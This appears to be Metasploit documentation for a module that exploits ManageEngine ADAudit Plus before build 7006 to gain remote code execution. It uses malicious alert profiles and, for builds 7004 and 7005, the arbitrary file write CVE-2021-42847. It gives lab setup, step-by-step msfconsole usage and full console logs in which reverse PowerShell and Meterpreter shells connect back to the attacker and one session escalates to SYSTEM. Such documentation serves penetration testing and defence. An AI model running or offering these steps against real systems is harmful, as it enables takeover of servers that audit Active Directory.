## Vulnerable Application
This module exploits security issues in ManageEngine ADAudit Plus prior to 7006 that allow authenticated users to execute arbitrary code
by creating a custom alert profile and leveraging the custom alert script component.

This module first runs a few checks to test the provided credentials, retrieve the configured domain(s), and
obtain the build number of ManageEngine. If the credentials are valid and the target is vulnerable, the module
creates an alert profile that will be triggered for any failed login attempt to the configured domain.

For versions prior to build 7004, the payload is directly inserted in the custom alert script component of the alert profile.

For builds 7004 and 7005, the module leverages an arbitrary file write vulnerability (CVE-2021-42847) to create a Powershell script
in the `alert_scripts` directory that contains the payload. Note that this directory will be located under the
ADAudit Plus installation directory. The name of this script is then provided as the value for the
custom alert script component of the alert profile. For these builds, Meterpreter payloads such as
`cmd/windows/powershell/meterpreter/reverse_tcp` do not seem to work and only the `cmd/windows/powershell_reverse_tcp`
payload has been tested successfully.

This module will automatically delete the created alert profile before completing. This happens even if no shell was obtained.

It should be noted that during a single run, the module will typically authenticate to the target several times.
This is because ADAudit Plus is very strict about cookies. After a user performs a successful authentication request,
the server sends a cookie that can be used to visit the dashboard. However, in order to interact with most of the API 
endpoints, the user must then perform a request to `api/json/configuredDomainsList`. Only then does the server return a
cookie that can be used to interact with other endpoints. If the above requests are not performed in this exact order,
or additional requests are performed before the final cookie is obtained, the entire authentication chain needs to be repeated.

This module requires valid credentials for an account with the privileges to create alert scripts.
It has been successfully tested against ManageEngine ADAudit Plus builds
[7003](https://archives2.manageengine.com/active-directory-audit/7003/ManageEngine_ADAudit_Plus_x64.exe) and
[7005](https://archives2.manageengine.com/active-directory-audit/7005/ManageEngine_ADAudit_Plus_x64.exe) running on Windows Server 2012 R2.

Successful exploitation will result in RCE as the user running ManageEngine ADAudit Plus, which will typically be the local administrator.

Note that exploitation may require a few attempts before a shell is returned. This is because there may be a delay before 
ManageEngine AdAudit Plus will properly fetch and process the alert which has been triggered. It is advisable to try a few
times, wait a bit, and then try again if you haven't gotten a shell.

## Installation Information
Vulnerable versions of ADAudit Plus are available [here](https://archives2.manageengine.com/active-directory-audit/).
Versions 7005 and prior are vulnerable by default, so no special configuration is required after installing the application.

After running the installer, you can launch ADAudit Plus by opening a command prompt with administrator privileges
and then running: `<install_dir>\bin\run.bat`. This will typically be at a location like `C:\Program Files\ManageEngine\ADAudit Plus\bin`.
Note that you may be asked to accept a license agreement and then be prompted for a license to use. Choose the Evaluation
license if this is the case. Note that targets running the Free license will not be able to be exploited due to limitations
imposed by the Free license on how often updates are retrieved.

Once this done, log into ADAudit Plus with the default credentials (set as default options for the module), aka `admin`:`admin`.
If the prompt `Default Domain Controllers Policy not configured` appears, click on the Configure link that appears to have
it configure the GPO Policy automatically for you.

Then go to notifications and check for one that says `Product Not Installed As Service` and click on `Install Now`. Once
this is done open `Group Policy Management` on the domain controller and go to Forest->Domains->Select your domain->
Default Domain Policy and right click on it then click `Edit`.

Select Computer Configuration->Policies->Windows Settings->Security Settings->Advanced Audit Policy Configuration->
Audit Policies->Logon/Logoff and set `Audit Logoff`, `Audit Logon`, `Audit Special Logon` and `Audit Other Logon/Logoff Events`
and check the `Configure the following audit events` box as well as the `Success` and `Failure` boxes beneath those.

Finally log out of the web portal. You should be able to run the module now.

## Verification Steps
1. Start msfconsole
2. Do: `use exploit/windows/http/manageengine_adaudit_plus_authenticated_rce`
3. Do: `set RHOSTS [IP]`
4. Do: `set LHOST [IP]`
5. Do: `set USERNAME [username]`
6. Do: `set PASSWORD [password]`
7. Do: `exploit`
8. Verify you get a shell on the target machine as the user running ManageEngine ADAudit Plus.

## Options
### AUTH_DOMAIN
The ADAudit Plus authentication domain to use. The default is `ADAuditPlus Authentication`. If the provided domain
does not match an authentication domain that is configured for the target, the module will throw an error and inform the user.

### USERNAME
Username to authenticate with. The default is `admin`, which matches the default ADAudit Plus credentials.

### PASSWORD
Password to authenticate with. The default is `admin`, which matches the default ADAudit Plus credentials.

## Scenarios
### ManageEngine ADAudit Plus build 7003 running on Windows Server 2012 R2
```
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > options

Module options (exploit/windows/http/manageengine_adaudit_plus_authenticated_rce):

   Name         Current Setting             Required  Description
   ----         ---------------             --------  -----------
   AUTH_DOMAIN  ADAuditPlus Authentication  yes       ADAudit Plus authentication domain (default is ADAuditPlus Authentication)
   PASSWORD     admin                       yes       Password to authenticate with
   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       192.168.91.250              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        8081                        yes       The target port (TCP)
   SSL          false                       no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                           yes       The base path to ManageEngine ADAudit Plus
   USERNAME     admin                       yes       Username to authenticate with
   VHOST                                    no        HTTP server virtual host


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         192.168.91.195   yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Command


msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.91.195:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Using configured authentication domain alias LIES.
[*] Trying to authenticate...
[*] Found 1 configured domain(s):
[*] - LIES.local: LIES.local
[+] Successfully authenticated
[+] The target appears to be vulnerable. The target is ADAudit Plus 7003
[*] Attempting to create an alert profile
[+] Successfully created alert profile UiYnupjyi24
[*] Attempting to trigger the payload via an authentication attempt for domain LIES using incorrect credentials.
[*] Trigger attempt completed. Let's hope we get a shell...
[*] Powershell session session 1 opened (192.168.91.195:4444 -> 192.168.91.250:54442) at 2022-10-12 12:09:43 +0300
[*] Powershell session session 2 opened (192.168.91.195:4444 -> 192.168.91.250:54441) at 2022-10-12 12:09:43 +0300
[*] Attempting to delete alert UiYnupjyi24
[+] Successfully deleted alert UiYnupjyi24

PS C:\Program Files\ManageEngine\ADAudit Plus\bin>whoami
lies\administrator
PS C:\Program Files\ManageEngine\ADAudit Plus\bin>
```

### ManageEngine ADAudit Plus build 7005 running on Windows Server 2012 R2
```
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.91.195:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Using configured authentication domain alias LIES.
[*] Trying to authenticate...
[*] Found 1 configured domain(s):
[*] - LIES.local: LIES.local
[+] Successfully authenticated
[+] The target appears to be vulnerable. The target is ADAudit Plus 7005 and the endpoint for CVE-2021-42847 exists.
[*] Attempting to authenticate again in order to retrieve the required cookies.
[*] Attempting to create an alert profile
[*] Attempting to write the payload to /alert_scripts/mwlhr.ps1
[+] Successfully wrote the payload to /alert_scripts/mwlhr.ps1 in the ManageEngine ADAudit Plus install directory
[+] Successfully created alert profile dVmy0Ygz
[*] Attempting to trigger the payload via an authentication attempt for domain LIES using incorrect credentials.
[*] Trigger attempt completed. Let's hope we get a shell...
[!] Make sure to manually cleanup the mwlhr.ps1 file from /alert_scripts/ in the ManageEngine ADAudit Plus install directory
[*] Powershell session session 1 opened (192.168.91.195:4444 -> 192.168.91.250:41348) at 2022-10-12 12:59:28 +0300
[*] Powershell session session 2 opened (192.168.91.195:4444 -> 192.168.91.250:41347) at 2022-10-12 12:59:28 +0300
[*] Attempting to delete alert profile dVmy0Ygz
[+] Successfully deleted profile alert dVmy0Ygz

PS C:\Program Files\ManageEngine\ADAudit Plus\bin>whoami
lies\administrator
PS C:\Program Files\ManageEngine\ADAudit Plus\bin>
```

### ManageEngine ADAudit Plus build 6077 running on Windows Server 2022 - Powershell Payload
```
msf6 > use exploit/windows/http/manageengine_adaudit_plus_authenticated_rce
[*] Using configured payload cmd/windows/powershell_reverse_tcp
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > set RHOSTS 192.168.204.132
RHOSTS => 192.168.204.132
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > set LHOST 192.168.204.128
LHOST => 192.168.204.128
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > show options

Module options (exploit/windows/http/manageengine_adaudit_plus_authenticated_rce):

   Name         Current Setting             Required  Description
   ----         ---------------             --------  -----------
   AUTH_DOMAIN  ADAuditPlus Authentication  yes       ADAudit Plus authentication domain (default is ADAuditPlus Authentication)
   PASSWORD     admin                       yes       Password to authenticate with
   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       192.168.204.132             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        8081                        yes       The target port (TCP)
   SSL          false                       no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                           yes       The base path to ManageEngine ADAudit Plus
   USERNAME     admin                       yes       Username to authenticate with
   VHOST                                    no        HTTP server virtual host


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         192.168.204.128  yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Command



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > check

[*] Using configured authentication domain alias DAFOREST.
[*] Attempting to authenticate to ADAuditPlus Authentication with username: admin and password: admin
[*] Found 1 configured domain(s): daforest.com
[+] Successfully authenticated
[*] 192.168.204.132:8081 - The target appears to be vulnerable. The target is ADAudit Plus 6077
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > exploit

[*] Started reverse TCP handler on 192.168.204.128:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Using configured authentication domain alias DAFOREST.
[*] Attempting to authenticate to ADAuditPlus Authentication with username: admin and password: admin
[*] Found 1 configured domain(s): daforest.com
[+] Successfully authenticated
[+] The target appears to be vulnerable. The target is ADAudit Plus 6077
[*] Attempting to create an alert profile
[+] Successfully created alert profile fw4hKcxDG
[*] Attempting to trigger the payload via an authentication attempt for domain DAFOREST using incorrect credentials.
[*] Received expected reply when trying to trigger the payload. Let's hope we get a shell...
[*] Powershell session session 2 opened (192.168.204.128:4444 -> 192.168.204.132:62845) at 2023-05-04 19:42:57 -0500
[*] Powershell session session 1 opened (192.168.204.128:4444 -> 192.168.204.132:62844) at 2023-05-04 19:42:57 -0500
[*] Attempting to delete alert profile fw4hKcxDG
[+] Successfully deleted alert profile fw4hKcxDG

PS C:\Program Files\ManageEngine\ADAudit Plus\bin> whoami
daforest\administrator
PS C:\Program Files\ManageEngine\ADAudit Plus\bin> ^X^Z
Background session 2? [y/N]  y
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > sessions

Active sessions
===============

  Id  Name  Type                Information                      Connection
  --  ----  ----                -----------                      ----------
  1         powershell windows  Administrator @ WIN-BRSHGJGIDFM  192.168.204.128:4444 -> 192.168.204.132:62844 (192.168.204.132)
  2         powershell windows  Administrator @ WIN-BRSHGJGIDFM  192.168.204.128:4444 -> 192.168.204.132:62845 (192.168.204.132)

msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) >
```

### ManageEngine ADAudit Plus build 6077 running on Windows Server 2022 - Meterpreter Payload
```
msf6 > use exploit/windows/http/manageengine_adaudit_plus_authenticated_rce
[*] Using configured payload cmd/windows/powershell_reverse_tcp
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > set RHOSTS 192.168.204.132
RHOSTS => 192.168.204.132
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > set LHOST 192.168.204.128
LHOST => 192.168.204.128
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > show options

Module options (exploit/windows/http/manageengine_adaudit_plus_authenticated_rce):

Name         Current Setting             Required  Description
   ----         ---------------             --------  -----------
AUTH_DOMAIN  ADAuditPlus Authentication  yes       ADAudit Plus authentication domain (default is ADAuditPlus Authentication)
PASSWORD     admin                       yes       Password to authenticate with
Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS       192.168.204.132             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
RPORT        8081                        yes       The target port (TCP)
SSL          false                       no        Negotiate SSL/TLS for outgoing connections
TARGETURI    /                           yes       The base path to ManageEngine ADAudit Plus
USERNAME     admin                       yes       Username to authenticate with
VHOST                                    no        HTTP server virtual host


Payload options (cmd/windows/powershell_reverse_tcp):

Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
LHOST         192.168.204.128  yes       The listen address (an interface may be specified)
LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
LPORT         4444             yes       The listen port


Exploit target:

Id  Name
   --  ----
0   Windows Command



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > set payload cmd/windows/powershell/x64/meterpreter/reverse_tcp
payload => cmd/windows/powershell/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > exploit

[*] Started reverse TCP handler on 192.168.204.128:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Using configured authentication domain alias DAFOREST.
[*] Attempting to authenticate to ADAuditPlus Authentication with username: admin and password: admin
[*] Found 1 configured domain(s): daforest.com
[+] Successfully authenticated
[+] The target appears to be vulnerable. The target is ADAudit Plus 6077
[*] Attempting to create an alert profile
[+] Successfully created alert profile iEQnR24qE9n1
[*] Attempting to trigger the payload via an authentication attempt for domain DAFOREST using incorrect credentials.
[*] Received expected reply when trying to trigger the payload. Let's hope we get a shell...
[*] Sending stage (200774 bytes) to 192.168.204.132
[*] Sending stage (200774 bytes) to 192.168.204.132
[-] Failed to load extension: uninitialized constant Rex::Post::Meterpreter::Extensions::Stdapi::Stdapi
WARNING: Local file /home/gwillcox/git/metasploit-framework/data/meterpreter/ext_server_priv.x64.dll is being used
WARNING: Local files may be incompatible with the Metasploit Framework
[!] If the client portion of stdapi or priv fails to load, you can do so manually via 'load stdapi' and/or load priv'
[*] Meterpreter session 4 opened (192.168.204.128:4444 -> 192.168.204.132:62858) at 2023-05-04 19:45:48 -0500
[*] Attempting to delete alert profile iEQnR24qE9n1
[*] Meterpreter session 3 opened (192.168.204.128:4444 -> 192.168.204.132:62857) at 2023-05-04 19:45:48 -0500
[+] Successfully deleted alert profile iEQnR24qE9n1

meterpreter > load stdapi
Loading extension stdapi...Success.
meterpreter > load priv
[!] The "priv" extension has already been loaded.
meterpreter > whoami
[-] Unknown command: whoami
meterpreter > getuid
Server username: DAFOREST\Administrator
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeDelegateSessionUserImpersonatePrivilege
SeEnableDelegationPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeMachineAccountPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

### ManageEngine ADAudit Plus build 7005 running on Windows Server 2022 - Powershell Payload

```
msf6 > use exploit/windows/http/manageengine_adaudit_plus_authenticated_rce
[*] Using configured payload cmd/windows/powershell_reverse_tcp
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > set RHOST 192.168.204.136
RHOST => 192.168.204.136
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > set LHOST 192.168.204.128
LHOST => 192.168.204.128
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > show options

Module options (exploit/windows/http/manageengine_adaudit_plus_authenticated_rce):

   Name         Current Setting             Required  Description
   ----         ---------------             --------  -----------
   AUTH_DOMAIN  ADAuditPlus Authentication  yes       ADAudit Plus authentication domain (default is ADAuditPlus Authentication)
   PASSWORD     admin                       yes       Password to authenticate with
   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       192.168.204.136             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        8081                        yes       The target port (TCP)
   SSL          false                       no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                           yes       The base path to ManageEngine ADAudit Plus
   USERNAME     admin                       yes       Username to authenticate with
   VHOST                                    no        HTTP server virtual host


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         192.168.204.128  yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Command



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > exploit

[*] Started reverse TCP handler on 192.168.204.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Using configured authentication domain alias DAFOREST.
[*] Attempting to authenticate to ADAuditPlus Authentication with username: admin and password: admin
[*] Found 1 configured domain(s): daforest.com
[+] Successfully authenticated
[+] The target appears to be vulnerable. The target is ADAudit Plus 7005 and the endpoint for CVE-2021-42847 exists.
[*] Attempting to authenticate again in order to retrieve the required cookies.
[*] Attempting to create an alert profile
[*] Attempting to write the payload to /alert_scripts/akbgtwuva.ps1
[+] Successfully wrote the payload to /alert_scripts/akbgtwuva.ps1 in the ManageEngine ADAudit Plus install directory
[+] Successfully created alert profile VA8dDG52p5
[*] Attempting to trigger the payload via an authentication attempt for domain DAFOREST using incorrect credentials.
[*] Received expected reply when trying to trigger the payload. Let's hope we get a shell...
[!] Make sure to manually cleanup the akbgtwuva.ps1 file from /alert_scripts/ in the ManageEngine ADAudit Plus install directory
[*] Powershell session session 2 opened (192.168.204.128:4444 -> 192.168.204.136:53465) at 2023-05-08 12:01:55 -0500
[*] Powershell session session 1 opened (192.168.204.128:4444 -> 192.168.204.136:53464) at 2023-05-08 12:01:55 -0500
[*] Attempting to delete alert profile VA8dDG52p5
[+] Successfully deleted alert profile VA8dDG52p5

PS C:\Program Files\ManageEngine\ADAudit Plus\bin> whoami
daforest\administrator
PS C:\Program Files\ManageEngine\ADAudit Plus\bin> pwd

Path                                          
----                                          
C:\Program Files\ManageEngine\ADAudit Plus\bin


PS C:\Program Files\ManageEngine\ADAudit Plus\bin> ^Z
Background session 2? [y/N]  y
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > sessions

Active sessions
===============

  Id  Name  Type                Information                      Connection
  --  ----  ----                -----------                      ----------
  1         powershell windows  Administrator @ WIN-BRSHGJGIDFM  192.168.204.128:4444 -> 192.168.204.136:53464 (192.168.204.136)
  2         powershell windows  Administrator @ WIN-BRSHGJGIDFM  192.168.204.128:4444 -> 192.168.204.136:53465 (192.168.204.136)

msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > 
```
